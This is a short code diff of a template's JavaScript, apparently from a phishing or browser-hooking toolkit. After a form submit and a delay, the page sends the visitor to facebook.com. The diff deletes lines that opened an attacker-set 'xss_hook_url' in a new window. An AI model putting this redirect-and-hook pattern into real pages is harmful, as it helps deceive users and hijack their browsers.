@@ -29,11 +29,6 @@ function clickedSubmitButton(){
     setTimeout("redirect()", <%= @wait_seconds_before_redirect %>);
 }
 function redirect(){
-    var theXssUrl = "<%== @xss_hook_url %>";
-    if(theXssUrl){
-        window.open(theXssUrl);
-        window.focus();
-    }
     window.location = "https://www.facebook.com/";
 }
 
